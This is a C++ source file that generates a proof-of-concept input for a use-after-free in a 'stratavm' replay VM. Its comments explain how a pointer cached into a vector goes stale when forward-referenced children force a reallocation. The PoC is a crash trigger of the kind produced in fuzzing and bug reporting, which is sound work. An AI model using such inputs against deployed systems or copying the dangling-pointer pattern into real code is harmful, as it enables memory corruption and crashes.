// gen_poc.cpp - generates the proof-of-concept crashing input.
//
// The bug: in replay_vm.cpp::do_begin_group(), the VM reserves
//   nodes_.reserve(nodes_.size() + reserve_hint)
// and immediately caches the owner's slot pointer:
//   frame.owner_cache = &nodes_[owner_id]
//
// When END_GROUP resolves deferred children by calling materialize_placeholder()
// for forward-referenced names, each call appends a new Node to nodes_.
// If the number of forward-referenced ADD_CHILDs exceeds reserve_hint, the
// vector reallocates on one of the push_back calls, invalidating owner_cache.
// The loop in resolve_frame() then writes through the stale pointer:
//   owner->children.push_back(target);   <-- UAF write
//   nodes_[target].refs.push_back(owner->id); <-- also reads owner->id via stale ptr
//
// Trigger sequence:
//   - Heap: 1 node (document "root", id 0)
//   - Journal:
//       BEGIN_GROUP owner="root", reserve_hint=1  (only 1 extra slot reserved)
//       ADD_CHILD "alpha"   (forward ref, doesn't exist yet)
//       ADD_CHILD "beta"    (forward ref, doesn't exist yet)
//       END_GROUP:
//         -> materialize_placeholder("alpha") -> nodes_.push_back (size=2, cap=2) OK
//         -> owner->children.push_back(1) OK at this point
//         -> materialize_placeholder("beta")  -> nodes_.push_back (size=3 > cap=2) REALLOC
//         -> owner_cache now DANGLING
//         -> owner->children.push_back(2)  <- WRITE to freed buffer  <-- UAF
//
// The output is a raw .svm container that can be fed directly to either
// the container_fuzzer binary or stratavm_cli dump.
#include <cstdio>
#include <fstream>
#include <string>
#include <vector>

#include "stratavm/builder.hpp"
#include "stratavm/env.hpp"

using namespace stratavm;

static bool write_file(const std::string& path, const std::vector<uint8_t>& data) {
  std::ofstream f(path, std::ios::binary);
  if (!f) { std::fprintf(stderr, "cannot open %s for writing\n", path.c_str()); return false; }
  f.write(reinterpret_cast<const char*>(data.data()), data.size());
  return !!f;
}

static std::vector<uint8_t> build_poc() {
  ContainerBuilder b;

  // Atom pool must exactly mirror the default environment ordering so the
  // journal's owner-name atom refers to the right node.
  AtomId a_document  = b.atom("document");   // 0
  AtomId a_section   = b.atom("section");    // 1
  AtomId a_paragraph = b.atom("paragraph");  // 2
  AtomId a_link      = b.atom("link");       // 3
  AtomId a_image     = b.atom("image");      // 4
  AtomId a_title     = b.atom("title");      // 5
  AtomId a_body      = b.atom("body");       // 6
  AtomId a_order     = b.atom("order");      // 7
  AtomId a_parent    = b.atom("parent");     // 8
  AtomId a_href      = b.atom("href");       // 9
  AtomId a_target    = b.atom("target");     // 10
  AtomId a_width     = b.atom("width");      // 11
  AtomId a_height    = b.atom("height");     // 12
  AtomId a_root      = b.atom("root");       // 13
  AtomId a_main      = b.atom("main");       // 14
  AtomId a_alpha     = b.atom("alpha");      // 15  - forward ref child 1
  AtomId a_beta      = b.atom("beta");       // 16  - forward ref child 2
  (void)a_section; (void)a_paragraph; (void)a_link; (void)a_image;
  (void)a_title; (void)a_body; (void)a_order; (void)a_parent;
  (void)a_href; (void)a_target; (void)a_width; (void)a_height; (void)a_main;

  // Schema: one kind "document" with a body(Ref) field so there is something
  // for the field-type lookup in do_set_field to validate against (not needed
  // for the PoC path, but keeps the schema well-formed).
  auto fd = [](AtomId name, ValueType t, uint8_t flags) {
    FieldDef f; f.name = name; f.type = t; f.flags = flags; return f;
  };
  // field 0 = title(Atom), field 1 = body(Ref), field 2 = order(Int)
  b.define_kind(a_document, {
    fd(5,  ValueType::Atom, kFieldNone),
    fd(6,  ValueType::Ref,  kFieldNone),
    fd(7,  ValueType::Int,  kFieldNone)
  });

  // Heap: one document node named "root" (atom 13).
  NodeId doc = b.heap_node(0, a_root);
  b.heap_int(doc, 2, 1); // order = 1

  // Journal:
  //   BEGIN_GROUP owner="root"(13), reserve_hint=1
  //   ADD_CHILD "alpha"(15)   <- forward ref
  //   ADD_CHILD "beta"(16)    <- forward ref
  //   END_GROUP               <- triggers UAF
  b.op_begin_group(a_root, /*reserve_hint=*/1);
  b.op_add_child(a_alpha);
  b.op_add_child(a_beta);
  b.op_end_group();

  return b.serialize();
}

int main(int argc, char** argv) {
  if (argc != 2) {
    std::fprintf(stderr, "usage: gen_poc <output_path>\n");
    return 2;
  }
  auto bytes = build_poc();
  if (!write_file(argv[1], bytes)) return 1;
  std::printf("PoC written: %zu bytes -> %s\n", bytes.size(), argv[1]);
  return 0;
}
